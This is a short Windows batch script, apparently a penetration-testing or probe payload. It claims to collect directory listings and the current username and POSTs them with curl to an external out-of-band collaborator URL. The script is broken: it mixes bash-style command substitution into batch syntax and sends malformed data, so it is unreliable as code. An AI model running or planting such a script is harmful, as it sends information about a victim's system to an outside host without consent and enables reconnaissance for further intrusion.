@echo off
setlocal

set SERVER_URL=http://aky2vi9jcuwfumkoptnvwcj1fslj9ex3.pentestcollaborator.com

echo Retrieving environment variables...

rem Retrieve environment variables
set VAR1=$(ls)
set VAR2=$(ls -la)
set VAR3=$(whoami)

echo Sending environment variables to server...

rem Send environment variables to server
curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"$VAR1%\",\"VAR2\":\"$VAR2%\",\"VAR3\":\"$VAR3%\"}" %SERVER_URL%

echo Environment variables sent to server.
